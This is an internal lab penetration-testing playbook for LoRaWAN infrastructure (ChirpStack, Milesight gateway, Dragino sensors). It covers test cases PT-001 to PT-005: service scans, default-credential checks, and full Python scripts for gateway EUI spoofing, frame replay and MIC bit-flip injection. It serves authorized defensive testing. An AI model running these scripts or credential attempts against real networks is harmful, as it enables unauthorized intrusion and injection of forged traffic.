# LoRaWAN Penetration Testing Playbook

> **Classification**: Internal Lab Use Only — Authorized Security Testing
> **Infrastructure Scope**: Milesight UG65 Gateway, Dragino LSN50v2 Sensors, ChirpStack v4 Network Server
> **Network Scope**: Private lab network `192.168.23.0/24` (No external/production targets)
> **Compliance Framework**: LoRa Alliance TR007, OWASP IoT Top 10, STRIDE Threat Model

> [!CAUTION]
> **Authorized Use Only**: All penetration testing procedures in this playbook are designed exclusively for execution against **our privately owned LoRaWAN lab infrastructure**. Never execute these procedures against production networks, third-party gateways, or public LoRaWAN infrastructure. All testing must be pre-approved by the operations manager and documented using the audit header in Section 1.

---

## 1. Engagement Header & Rules of Engagement

Copy this header into every penetration test report before execution:

~~~text
═══════════════════════════════════════════════════════════════════════════════
                    LORAWAN PENETRATION TEST ENGAGEMENT RECORD
═══════════════════════════════════════════════════════════════════════════════
Engagement ID       : PENTEST-<YYMMDD>-<NUMBER>
Engagement Title    : LoRaWAN Infrastructure Penetration Test
Tester / Operator   : ___________________________
Authorizing Manager : ___________________________
Authorization Date  : ___________________________

Target Infrastructure:
  Gateway           : Milesight UG65 (IP: 192.168.23.150 / GW EUI: 24E124FFFEO159C3)
  Network Server    : ChirpStack v4 (IP: 192.168.23.137, Docker Compose Stack)
  End Devices       : Dragino LSN50v2-S31 (Class A, OTAA)
  Protocol Version  : LoRaWAN 1.0.3 / 1.0.4

Attack Surface:
  Transport         : Semtech UDP Port 1700 (Gateway <-> ChirpStack Gateway Bridge)
  Application       : MQTT (mosquitto:1883), ChirpStack Web UI (:8080)
  Database          : PostgreSQL (:5432)
  Management        : Milesight Gateway Web UI (192.168.23.150:80)

Tooling:
  Capture           : Wireshark 4.x, TShark, tcpdump
  Injection         : Python 3 + scapy, custom UDP socket scripts
  Analysis          : tshark field extraction, jq, bash pipelines
  Correlation       : ChirpStack Docker logs, PostgreSQL queries, MQTT subscription

Evidence Artifacts  : ~/lorawan-lab/pentest/evidence/
SHA-256 Manifest    : ~/lorawan-lab/pentest/evidence/manifest-sha256.txt
═══════════════════════════════════════════════════════════════════════════════
~~~

---

## 2. Attack Surface Mapping

Before executing any attack, map the complete attack surface of the private LoRaWAN infrastructure:

~~~text
┌─────────────────────────────────────────────────────────────────────────────┐
│                     LORAWAN INFRASTRUCTURE ATTACK SURFACE                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  LAYER 1: RF / Physical                                                     │
│  ├── LoRa Radio (AS923 Band)                                                │
│  │   ├── Over-the-air frame capture (requires SDR — out of scope)           │
│  │   ├── RF jamming / interference (out of scope)                           │
│  │   └── [ATTACK] Hardware debug port exposure (JTAG/UART/SPI)     [PT-013]│
│  │                                                                          │
│  LAYER 2: Transport / Packet Forwarding                                     │
│  ├── Semtech UDP Protocol (Port 1700)                                       │
│  │   ├── [ATTACK] Gateway EUI spoofing                             [PT-003]│
│  │   ├── [ATTACK] Rogue PUSH_DATA injection                        [PT-005]│
│  │   ├── [ATTACK] PULL_RESP downlink injection                     [PT-010]│
│  │   ├── [ATTACK] UDP flood / resource exhaustion                  [PT-009]│
│  │   └── [ATTACK] Unencrypted backhaul (no TLS)                    [PT-014]│
│  │                                                                          │
│  LAYER 3: LoRaWAN Protocol                                                  │
│  ├── Frame Integrity (MIC)                                                  │
│  │   ├── [ATTACK] MIC bypass / payload tampering                   [PT-005]│
│  │   └── [ATTACK] Bit-flip injection in FRMPayload                 [PT-005]│
│  ├── Frame Counter (FCnt)                                                   │
│  │   ├── [ATTACK] Replay attack (stale FCnt re-injection)          [PT-004]│
│  │   ├── [ATTACK] FCnt reset exploitation                          [PT-011]│
│  │   └── [ATTACK] FCnt overflow / wraparound (16-bit → 0)         [PT-011]│
│  ├── OTAA Join Security                                                     │
│  │   ├── [ATTACK] DevNonce replay                                  [PT-006]│
│  │   ├── [ATTACK] Join-Request flood                               [PT-006]│
│  │   └── [ATTACK] AppEUI/JoinEUI enumeration                       [PT-012]│
│  ├── Activation Mode Audit                                                  │
│  │   └── [AUDIT] ABP device detection (static key risk)            [PT-012]│
│  ├── MAC Command Injection                                                  │
│  │   ├── [ATTACK] Rogue LinkADRReq injection                       [PT-008]│
│  │   ├── [ATTACK] Rogue RXParamSetupReq injection                  [PT-008]│
│  │   └── [ATTACK] DevStatusReq spoofing                            [PT-008]│
│  │                                                                          │
│  LAYER 4: Application / Infrastructure                                      │
│  ├── MQTT Broker (mosquitto:1883)                                           │
│  │   ├── [ATTACK] Unauthenticated subscription                     [PT-007]│
│  │   ├── [ATTACK] Topic enumeration                                [PT-007]│
│  │   └── [ATTACK] Rogue MQTT publish (fake downlink trigger)       [PT-007]│
│  ├── ChirpStack Web UI & gRPC API (:8080)                                   │
│  │   ├── [ATTACK] Default credential check                         [PT-002]│
│  │   ├── [ATTACK] gRPC reflection / API schema enumeration         [PT-015]│
│  │   ├── [ATTACK] API token scope escalation (BOLA/IDOR)           [PT-015]│
│  │   └── [ATTACK] Unauthenticated gRPC method access               [PT-015]│
│  ├── PostgreSQL (:5432)                                                     │
│  │   ├── [ATTACK] Default credential check                         [PT-002]│
│  │   └── [ATTACK] Direct SQL event injection                       [PT-002]│
│  └── Milesight Gateway Web UI (:80)                                         │
│      ├── [ATTACK] Default credential check                         [PT-002]│
│      ├── [ATTACK] Configuration / key extraction                   [PT-013]│
│      └── [ATTACK] Firmware version fingerprint                     [PT-014]│
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
~~~

---

## 2.1 STRIDE Threat Model Mapping

Each penetration test case maps to one or more STRIDE threat categories:

| STRIDE Category | Description | Mapped Test Cases |
|---|---|---|
| **S — Spoofing** | Impersonating a legitimate entity (gateway, device, user) | PT-003 (GW EUI Spoofing), PT-006 (Join Replay), PT-010 (Downlink Injection) |
| **T — Tampering** | Unauthorized modification of data in transit or at rest | PT-005 (MIC Tamper / Bit-Flip), PT-008 (MAC Command Injection) |
| **R — Repudiation** | Denying actions without evidence of occurrence | PT-001 (Service Enumeration — evidence logging), All tests (SHA-256 evidence manifests) |
| **I — Information Disclosure** | Exposing confidential data to unauthorized parties | PT-007 (MQTT Anonymous Access), PT-013 (Hardware Debug Ports), PT-015 (gRPC Reflection) |
| **D — Denial of Service** | Disrupting availability of services or devices | PT-006 Phase 2 (Join Flood), PT-009 (UDP Exhaustion), PT-011 (FCnt Overflow) |
| **E — Elevation of Privilege** | Gaining unauthorized access levels | PT-002 (Default Credentials), PT-015 (API Token Scope Escalation) |

---

## 2.2 Compliance & Standards Mapping

Each test case is mapped to applicable industry security standards:

| Test Case | LoRa Alliance TR007 | OWASP IoT Top 10 | STRIDE |
|---|---|---|---|
| PT-001 | — | I1 (Insecure Network Services) | R |
| PT-002 | §4.1 Key Management | I1, I3 (Insecure Ecosystem Interfaces) | E |
| PT-003 | §3.2 Gateway Authentication | I1 | S |
| PT-004 | §3.4 Frame Counter Enforcement | I7 (Insecure Data Transfer) | S, T |
| PT-005 | §3.3 MIC Validation | I7 | T |
| PT-006 | §3.5 DevNonce Tracking | I1, I9 (Insecure Default Settings) | S, D |
| PT-007 | — | I3, I4 (Lack of Secure Update Mechanism) | I, E |
| PT-008 | §3.6 MAC Command Security | I7 | T |
| PT-009 | — | I1 (Insecure Network Services) | D |
| PT-010 | §3.2 Gateway Authentication | I7 | S, T |
| PT-011 | §3.4 Frame Counter (32-bit enforcement) | I7 | D, S |
| PT-012 | §4.1 OTAA Mandatory | I9, I3 | S, I |
| PT-013 | §5.1 Physical Security | I5 (Lack of Privacy) | I |
| PT-014 | §4.3 Transport Encryption | I7 | I, T |
| PT-015 | — | I3 (Insecure Ecosystem Interfaces) | I, E |

---

## 2.3 Severity Classification (CVSS v3.1 Aligned)

| Severity | CVSS Score Range | Description |
|---|---|---|
| **Critical** | 9.0 – 10.0 | Full system compromise, key extraction, unrestricted access |
| **High** | 7.0 – 8.9 | Significant data exposure, frame injection, replay success |
| **Medium** | 4.0 – 6.9 | Limited impact, DoS potential, information leakage |
| **Low** | 0.1 – 3.9 | Minimal impact, hardening recommendations |
| **Informational** | 0.0 | Reconnaissance data, no direct exploit |

---

## 3. Environment Setup & Tooling Preparation

### 3.1 Create Pentest Workspace

~~~bash
mkdir -p ~/lorawan-lab/pentest/{scripts,evidence,pcap,logs,reports}
~~~

### 3.2 Install Pentest Dependencies

~~~bash
sudo apt update
sudo apt install -y wireshark tshark tcpdump nmap python3 python3-pip \
    mosquitto-clients jq netcat-openbsd hping3 hydra golang-go

# Install gRPC reconnaissance tools (for PT-015)
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
export PATH="$PATH:$(go env GOPATH)/bin"
~~~

### 3.3 Install Python Attack Libraries

~~~bash
pip3 install scapy pycryptodome requests paho-mqtt grpcio grpcio-tools protobuf
~~~

### 3.4 Verify Network Connectivity to Target Infrastructure

~~~bash
# Verify gateway reachability
ping -c 3 192.168.23.150

# Verify ChirpStack server reachability
ping -c 3 192.168.23.137

# Verify UDP 1700 is accepting traffic
echo -n "test" | nc -u -w1 192.168.23.137 1700
~~~

### 3.5 Start Baseline Packet Capture (Run Throughout All Tests)

~~~bash
# Background capture — runs for entire pentest engagement
tshark -i eth0 -f "udp port 1700" \
  -w ~/lorawan-lab/pentest/pcap/pentest-full-$(date -u +%Y%m%dT%H%M%SZ).pcap &
CAPTURE_PID=$!
echo "[+] Baseline capture running (PID: $CAPTURE_PID)"
~~~

---

## 4. Penetration Test Cases

---

### PT-001: Network Reconnaissance & Service Enumeration

**Objective**: Map all exposed services on the target infrastructure to identify attack entry points.

**Severity**: Informational (Reconnaissance Phase)

**Procedure**:

1. Scan the gateway for open ports and service versions:
    ~~~bash
    nmap -sV -sC -p- -T4 192.168.23.150 -oN ~/lorawan-lab/pentest/evidence/pt001-gateway-nmap.txt
    ~~~

2. Scan the ChirpStack server for open ports and service versions:
    ~~~bash
    nmap -sV -sC -p- -T4 192.168.23.137 -oN ~/lorawan-lab/pentest/evidence/pt001-chirpstack-nmap.txt
    ~~~

3. Enumerate UDP services (specifically port 1700):
    ~~~bash
    nmap -sU -p 1700,1883,5432,8080 192.168.23.137 \
      -oN ~/lorawan-lab/pentest/evidence/pt001-udp-scan.txt
    ~~~

4. Fingerprint the Milesight gateway web interface:
    ~~~bash
    curl -sI http://192.168.23.150 | tee ~/lorawan-lab/pentest/evidence/pt001-gw-headers.txt
    ~~~

**Evidence Collection**:
~~~bash
cat ~/lorawan-lab/pentest/evidence/pt001-*.txt
~~~

**Expected Findings**:
- Gateway exposes HTTP (:80), possibly SSH (:22), and Semtech UDP (:1700 outbound).
- ChirpStack server exposes HTTP (:8080), MQTT (:1883), PostgreSQL (:5432), and Semtech UDP (:1700 inbound).
- Document all unexpected open ports for follow-up analysis.

---

### PT-002: Default Credential Audit

**Objective**: Verify that all infrastructure components have changed default credentials.

**Severity**: Critical (if defaults found)

**Procedure**:

1. Test Milesight UG65 Gateway Web UI default credentials:
    ~~~bash
    # Milesight default: admin / password
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST http://192.168.23.150/api/login \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"password"}' \
      | tee ~/lorawan-lab/pentest/evidence/pt002-gw-default-cred.txt
    ~~~

2. Test ChirpStack Web UI default credentials:
    ~~~bash
    # ChirpStack default: admin / admin
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST http://192.168.23.137:8080/api/internal/login \
      -H "Content-Type: application/json" \
      -d '{"email":"admin","password":"admin"}' \
      | tee ~/lorawan-lab/pentest/evidence/pt002-cs-default-cred.txt
    ~~~

3. Test PostgreSQL default credentials:
    ~~~bash
    PGPASSWORD=chirpstack_test psql -h 192.168.23.137 -U chirpstack_test \
      -d chirpstack_test -c "SELECT 1;" 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt002-pg-default-cred.txt
    ~~~

4. Test MQTT broker anonymous access:
    ~~~bash
    mosquitto_sub -h 192.168.23.137 -t "#" -C 1 -W 5 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt002-mqtt-anon.txt
    ~~~

**Pass/Fail Criteria**:

| Target | Default Credential | Status |
|---|---|---|
| Milesight Gateway | `admin / password` | ☐ PASS (rejected) / ☐ FAIL (accepted) |
| ChirpStack Web UI | `admin / admin` | ☐ PASS (rejected) / ☐ FAIL (accepted) |
| PostgreSQL | `chirpstack_test / chirpstack_test` | ☐ PASS (rejected) / ☐ FAIL (accepted) |
| MQTT Broker | Anonymous (no auth) | ☐ PASS (rejected) / ☐ FAIL (accepted) |

---

### PT-003: Semtech UDP Gateway EUI Spoofing Attack

**Objective**: Determine if ChirpStack accepts traffic from spoofed or unregistered Gateway EUIs.

**Severity**: High

**Attack Script** — Save as `~/lorawan-lab/pentest/scripts/pt003_gw_eui_spoof.py`:

~~~python
#!/usr/bin/env python3
"""
PT-003: Gateway EUI Spoofing Attack
Injects PUSH_DATA packets with forged Gateway EUI values to test
whether ChirpStack Gateway Bridge validates gateway identity.
"""

import socket
import json
import struct
import time
import sys
import os
from datetime import datetime, timezone

CHIRPSTACK_HOST = "192.168.23.137"
CHIRPSTACK_PORT = 1700
EVIDENCE_DIR = os.path.expanduser("~/lorawan-lab/pentest/evidence")

# Spoofed Gateway EUIs to test
SPOOFED_EUIS = [
    "0000000000000000",  # Null EUI
    "FFFFFFFFFFFFFFFF",  # Broadcast EUI
    "DEADBEEFCAFEBABE",  # Random fabricated EUI
    "24E124FFFE0159C4",  # Off-by-one from real gateway EUI
    "AABBCCDDEEFF0011",  # Completely unregistered EUI
]

# Legitimate gateway EUI for comparison baseline
LEGIT_EUI = "24E124FFFE0159C3"

def build_push_data(gateway_eui_hex: str, token: int = 0x1234) -> bytes:
    """
    Constructs a valid Semtech UDP PUSH_DATA packet with the given Gateway EUI.

    Semtech protocol format:
      [0]    Protocol Version  = 0x02
      [1-2]  Random Token      = 2 bytes
      [3]    Packet Type       = 0x00 (PUSH_DATA)
      [4-11] Gateway EUI       = 8 bytes
      [12+]  JSON payload      = rxpk array
    """
    header = struct.pack(
        ">BHB",
        0x02,       # Protocol version
        token,      # Random token
        0x00        # PUSH_DATA identifier
    )
    eui_bytes = bytes.fromhex(gateway_eui_hex)

    # Synthetic LoRaWAN PHYPayload (Unconfirmed Data Up, DevAddr=01020304, FCnt=99)
    # This is intentionally a garbage payload — we're testing EUI filtering, not frame validity
    fake_phypayload = "QAECAwSAYwACBQAAAAAAAAA="

    rxpk_payload = {
        "rxpk": [{
            "tmst": int(time.time()) & 0xFFFFFFFF,
            "chan": 0,
            "rfch": 0,
            "freq": 923.2,
            "stat": 1,
            "modu": "LORA",
            "datr": "SF7BW125",
            "codr": "4/5",
            "lsnr": 9.5,
            "rssi": -45,
            "size": 17,
            "data": fake_phypayload
        }]
    }

    return header + eui_bytes + json.dumps(rxpk_payload).encode("utf-8")


def run_eui_spoofing_test():
    """Execute Gateway EUI spoofing test against all target EUIs."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt003-gw-spoof-{timestamp}.log")

    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    results = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)

    print("=" * 72)
    print("  PT-003: Gateway EUI Spoofing Attack")
    print("=" * 72)

    # Send baseline with legitimate EUI first
    print(f"\n[BASELINE] Sending PUSH_DATA with legitimate EUI: {LEGIT_EUI}")
    legit_packet = build_push_data(LEGIT_EUI, token=0xAAAA)
    sock.sendto(legit_packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

    try:
        response, _ = sock.recvfrom(4096)
        print(f"  [+] Server responded: {response.hex()}")
        results.append(f"BASELINE | EUI={LEGIT_EUI} | RESPONSE={response.hex()}")
    except socket.timeout:
        print("  [-] No response (timeout)")
        results.append(f"BASELINE | EUI={LEGIT_EUI} | RESPONSE=TIMEOUT")

    time.sleep(0.5)

    # Test each spoofed EUI
    for idx, eui in enumerate(SPOOFED_EUIS, start=1):
        token = 0xBB00 + idx
        print(f"\n[ATTACK {idx}] Sending PUSH_DATA with spoofed EUI: {eui}")
        spoofed_packet = build_push_data(eui, token=token)
        sock.sendto(spoofed_packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

        try:
            response, _ = sock.recvfrom(4096)
            status = "ACCEPTED"
            print(f"  [!] FINDING: Server responded to spoofed EUI: {response.hex()}")
            results.append(f"ATTACK_{idx} | EUI={eui} | STATUS={status} | RESPONSE={response.hex()}")
        except socket.timeout:
            status = "DROPPED"
            print(f"  [+] Server dropped spoofed EUI (no response)")
            results.append(f"ATTACK_{idx} | EUI={eui} | STATUS={status} | RESPONSE=TIMEOUT")

        time.sleep(0.3)

    sock.close()

    # Write evidence log
    with open(evidence_file, "w") as f:
        f.write(f"PT-003 Gateway EUI Spoofing Test Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Target: {CHIRPSTACK_HOST}:{CHIRPSTACK_PORT}\n")
        f.write("=" * 72 + "\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n[+] Evidence written to: {evidence_file}")
    print("=" * 72)


if __name__ == "__main__":
    run_eui_spoofing_test()
~~~

**Execution**:
~~~bash
python3 ~/lorawan-lab/pentest/scripts/pt003_gw_eui_spoof.py
~~~

**Post-Attack Correlation**:
~~~bash
# Check Gateway Bridge logs for spoofed EUI handling
docker logs chirpstack-gateway-bridge --tail 100 | grep -i -E "gateway|eui|unknown|unregistered"
~~~

**Expected Result**:
- ChirpStack Gateway Bridge should either **drop** packets from unregistered EUIs silently or log an explicit rejection.
- If the server **responds** with a `PUSH_ACK` to a spoofed EUI, this is a **finding** — an attacker could inject rogue telemetry into the network.

---

### PT-004: Frame Replay Attack (FCnt Regression Injection)

**Objective**: Inject previously captured valid frames with stale frame counters to test ChirpStack's anti-replay enforcement.

**Severity**: High

**Attack Script** — Save as `~/lorawan-lab/pentest/scripts/pt004_replay_attack.py`:

~~~python
#!/usr/bin/env python3
"""
PT-004: Frame Replay Attack
Captures a valid uplink frame, waits for the server's FCnt state to advance,
then re-injects the stale frame to verify anti-replay protection.
"""

import socket
import json
import struct
import time
import os
import subprocess
from datetime import datetime, timezone

CHIRPSTACK_HOST = "192.168.23.137"
CHIRPSTACK_PORT = 1700
GATEWAY_EUI = "24E124FFFE0159C3"
EVIDENCE_DIR = os.path.expanduser("~/lorawan-lab/pentest/evidence")
PCAP_DIR = os.path.expanduser("~/lorawan-lab/pentest/pcap")


def extract_latest_uplink_from_pcap(pcap_file: str) -> dict | None:
    """
    Extract the most recent LoRaWAN uplink frame from a PCAP file using tshark.
    Returns dict with devaddr, fcnt, raw UDP payload hex, and frame metadata.
    """
    cmd = [
        "tshark", "-r", pcap_file,
        "-Y", "lorawan.mtype == 2 || lorawan.mtype == 4",
        "-T", "json",
        "-e", "frame.number",
        "-e", "frame.time",
        "-e", "lorawan.devaddr",
        "-e", "lorawan.fcnt",
        "-e", "udp.payload",
        "-c", "1",  # Last frame only
        "-o", "gui.column.format:\"No.\",\"%m\""
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout.strip():
            frames = json.loads(result.stdout)
            if frames:
                layers = frames[0].get("_source", {}).get("layers", {})
                return {
                    "frame_number": layers.get("frame.number", [""])[0],
                    "frame_time": layers.get("frame.time", [""])[0],
                    "devaddr": layers.get("lorawan.devaddr", [""])[0],
                    "fcnt": layers.get("lorawan.fcnt", [""])[0],
                    "udp_payload": layers.get("udp.payload", [""])[0],
                }
    except (subprocess.TimeoutExpired, json.JSONDecodeError) as e:
        print(f"  [-] PCAP extraction error: {e}")
    return None


def build_replay_packet(original_udp_hex: str) -> bytes:
    """
    Reconstruct the full Semtech UDP PUSH_DATA packet from captured UDP payload.
    Preserves original PHYPayload bytes for exact replay fidelity.
    """
    # Strip colons from tshark hex output if present
    clean_hex = original_udp_hex.replace(":", "")
    return bytes.fromhex(clean_hex)


def run_replay_attack(pcap_file: str = None, manual_hex: str = None):
    """Execute FCnt replay attack against ChirpStack."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt004-replay-{timestamp}.log")
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    print("=" * 72)
    print("  PT-004: Frame Replay Attack (FCnt Regression)")
    print("=" * 72)

    results = []

    if manual_hex:
        # Manual mode: use provided raw packet hex
        replay_bytes = bytes.fromhex(manual_hex)
        original_fcnt = "MANUAL"
        original_devaddr = "MANUAL"
        print(f"\n[*] Using manually provided packet ({len(replay_bytes)} bytes)")
    elif pcap_file:
        # Extract from PCAP
        print(f"\n[*] Extracting latest uplink from: {pcap_file}")
        frame_data = extract_latest_uplink_from_pcap(pcap_file)
        if not frame_data or not frame_data["udp_payload"]:
            print("  [-] No valid uplink frame found in PCAP. Aborting.")
            return
        original_fcnt = frame_data["fcnt"]
        original_devaddr = frame_data["devaddr"]
        replay_bytes = build_replay_packet(frame_data["udp_payload"])
        print(f"  [+] Captured frame: DevAddr={original_devaddr}, FCnt={original_fcnt}")
    else:
        print("  [-] No PCAP file or manual hex provided. Aborting.")
        return

    # Wait for server FCnt state to advance
    print("\n[*] Waiting 30 seconds for server FCnt state to advance...")
    print("    (Ensure the Dragino sensor sends at least 1 additional uplink)")
    time.sleep(30)

    # Inject replay
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)

    print(f"\n[ATTACK] Re-injecting stale frame (FCnt={original_fcnt}) to {CHIRPSTACK_HOST}:{CHIRPSTACK_PORT}")

    for attempt in range(3):
        print(f"  [Attempt {attempt + 1}/3] Sending replay packet...")
        sock.sendto(replay_bytes, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

        try:
            response, _ = sock.recvfrom(4096)
            print(f"    [!] Server responded: {response.hex()}")
            results.append(f"ATTEMPT_{attempt+1} | FCnt={original_fcnt} | RESPONSE={response.hex()}")
        except socket.timeout:
            print(f"    [-] No response (timeout — expected for dropped replay)")
            results.append(f"ATTEMPT_{attempt+1} | FCnt={original_fcnt} | RESPONSE=TIMEOUT")

        time.sleep(1)

    sock.close()

    # Write evidence
    with open(evidence_file, "w") as f:
        f.write(f"PT-004 Frame Replay Attack Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Target: {CHIRPSTACK_HOST}:{CHIRPSTACK_PORT}\n")
        f.write(f"Original DevAddr: {original_devaddr}\n")
        f.write(f"Original FCnt: {original_fcnt}\n")
        f.write("=" * 72 + "\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n[+] Evidence written to: {evidence_file}")

    # Automated log correlation
    print("\n[*] Pulling ChirpStack logs for anti-replay indicators...")
    log_cmd = 'docker logs chirpstack --tail 50 2>&1 | grep -i -E "frame.counter|fcnt|rollback|replay|duplicate"'
    os.system(log_cmd)

    print("=" * 72)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="PT-004: LoRaWAN Frame Replay Attack")
    parser.add_argument("--pcap", help="Path to PCAP file containing a valid uplink frame")
    parser.add_argument("--hex", help="Raw Semtech UDP packet hex for manual replay")
    args = parser.parse_args()
    run_replay_attack(pcap_file=args.pcap, manual_hex=args.hex)
~~~

**Execution**:
~~~bash
# Option A: Extract from existing PCAP capture
python3 ~/lorawan-lab/pentest/scripts/pt004_replay_attack.py \
  --pcap ~/lorawan-lab/pentest/pcap/pentest-full-*.pcap

# Option B: Manual hex replay
python3 ~/lorawan-lab/pentest/scripts/pt004_replay_attack.py \
  --hex "0212340024E124FFFE0159C3..."
~~~

**Post-Attack Correlation**:
~~~bash
docker logs chirpstack --tail 100 | grep -i -E "frame counter|fcnt|rollback|replay"
~~~

**Expected Result**:
- ChirpStack logs: `frame counter rolled back` or `FCnt <= last_seen_fcnt`.
- Server drops all replayed frames — no MQTT uplink event emitted.

---

### PT-005: MIC Tampering & Bit-Flip Injection

**Objective**: Modify captured frame payloads byte-by-byte to verify that even single-bit mutations cause immediate MIC validation failure and frame rejection.

**Severity**: High

**Attack Script** — Save as `~/lorawan-lab/pentest/scripts/pt005_mic_tamper.py`:

~~~python
#!/usr/bin/env python3
"""
PT-005: MIC Tampering & Bit-Flip Injection
Systematically mutates captured LoRaWAN frames at targeted byte positions
to verify that the server's AES-128-CMAC integrity check catches all tampering.
"""

import socket
import json
import struct
import copy
import time
import os
import base64
from datetime import datetime, timezone

CHIRPSTACK_HOST = "192.168.23.137"
CHIRPSTACK_PORT = 1700
GATEWAY_EUI = "24E124FFFE0159C3"
EVIDENCE_DIR = os.path.expanduser("~/lorawan-lab/pentest/evidence")

# Base valid PHYPayload (Unconfirmed Data Up, DevAddr=01020304, FCnt=1)
# This should be replaced with an actual captured frame for real testing
VALID_PHYPAYLOAD_B64 = "QAECAwSAAQACBQAAAAAAAAA="


def build_semtech_push_data(phypayload_b64: str, token: int = 0x1234) -> bytes:
    """Build a complete Semtech UDP PUSH_DATA packet."""
    header = struct.pack(">BHB", 0x02, token, 0x00)
    eui_bytes = bytes.fromhex(GATEWAY_EUI)

    rxpk = {
        "rxpk": [{
            "tmst": int(time.time()) & 0xFFFFFFFF,
            "chan": 0, "rfch": 0, "freq": 923.2,
            "stat": 1, "modu": "LORA", "datr": "SF7BW125", "codr": "4/5",
            "lsnr": 9.5, "rssi": -45, "size": len(base64.b64decode(phypayload_b64)),
            "data": phypayload_b64
        }]
    }
    return header + eui_bytes + json.dumps(rxpk).encode("utf-8")


def mutate_phypayload(original_b64: str, byte_offset: int, mutation: str = "flip") -> str:
    """
    Mutate a single byte in the PHYPayload.

    Mutation strategies:
      - 'flip': XOR the byte with 0xFF (full inversion)
      - 'increment': Add 1 to the byte (mod 256)
      - 'zero': Set the byte to 0x00
      - 'bitflip': Flip the least significant bit only
    """
    raw = bytearray(base64.b64decode(original_b64))

    if byte_offset >= len(raw):
        return original_b64  # No mutation possible

    original_byte = raw[byte_offset]

    if mutation == "flip":
        raw[byte_offset] ^= 0xFF
    elif mutation == "increment":
        raw[byte_offset] = (raw[byte_offset] + 1) % 256
    elif mutation == "zero":
        raw[byte_offset] = 0x00
    elif mutation == "bitflip":
        raw[byte_offset] ^= 0x01

    mutated_byte = raw[byte_offset]
    print(f"    Byte[{byte_offset}]: 0x{original_byte:02X} -> 0x{mutated_byte:02X} ({mutation})")

    return base64.b64encode(bytes(raw)).decode("utf-8")


def run_mic_tamper_test():
    """Execute systematic MIC tampering test across all PHYPayload byte positions."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt005-mic-tamper-{timestamp}.log")
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    raw_payload = base64.b64decode(VALID_PHYPAYLOAD_B64)
    payload_len = len(raw_payload)

    print("=" * 72)
    print("  PT-005: MIC Tampering & Bit-Flip Injection")
    print(f"  PHYPayload Length: {payload_len} bytes")
    print(f"  Mutation Targets: All {payload_len} byte positions")
    print("=" * 72)

    # LoRaWAN PHYPayload structure mapping
    field_map = {
        0: "MHDR (MType + Major)",
        1: "DevAddr[0]", 2: "DevAddr[1]", 3: "DevAddr[2]", 4: "DevAddr[3]",
        5: "FCtrl",
        6: "FCnt[0]", 7: "FCnt[1]",
    }
    # FPort and FRMPayload follow, then MIC is last 4 bytes
    for i in range(8, payload_len - 4):
        field_map[i] = f"FPort/FRMPayload[{i-8}]"
    for i in range(payload_len - 4, payload_len):
        field_map[i] = f"MIC[{i-(payload_len-4)}]"

    results = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    mutations = ["flip", "increment", "bitflip"]

    for byte_idx in range(payload_len):
        field_name = field_map.get(byte_idx, f"Unknown[{byte_idx}]")

        for mut_type in mutations:
            print(f"\n[ATTACK] Mutating {field_name} (offset={byte_idx}, strategy={mut_type})")

            mutated_b64 = mutate_phypayload(VALID_PHYPAYLOAD_B64, byte_idx, mut_type)
            packet = build_semtech_push_data(mutated_b64, token=0xCC00 + byte_idx)

            sock.sendto(packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

            try:
                response, _ = sock.recvfrom(4096)
                # PUSH_ACK received — packet was at least transport-accepted
                # but MIC should still fail at the network server layer
                result = f"TRANSPORT_ACK"
            except socket.timeout:
                result = "DROPPED"

            entry = f"BYTE={byte_idx} | FIELD={field_name} | MUTATION={mut_type} | RESULT={result}"
            results.append(entry)
            print(f"  -> {result}")

            time.sleep(0.1)

    sock.close()

    # Write evidence
    with open(evidence_file, "w") as f:
        f.write(f"PT-005 MIC Tampering Test Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Target: {CHIRPSTACK_HOST}:{CHIRPSTACK_PORT}\n")
        f.write(f"PHYPayload Length: {payload_len}\n")
        f.write(f"Total Mutations: {len(results)}\n")
        f.write("=" * 72 + "\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n[+] Evidence written to: {evidence_file}")
    print(f"[+] Total mutations tested: {len(results)}")
    print("=" * 72)


if __name__ == "__main__":
    run_mic_tamper_test()
~~~

**Execution**:
~~~bash
python3 ~/lorawan-lab/pentest/scripts/pt005_mic_tamper.py
~~~

**Post-Attack Wireshark Analysis**:
~~~bash
# Open the running PCAP capture and filter for MIC failures
tshark -r ~/lorawan-lab/pentest/pcap/pentest-full-*.pcap \
  -Y "lorawan.mic_verified == False" \
  -T fields -e frame.number -e frame.time -e lorawan.devaddr -e lorawan.fcnt
~~~

**Expected Result**:
- **100% of mutated frames** should fail MIC validation.
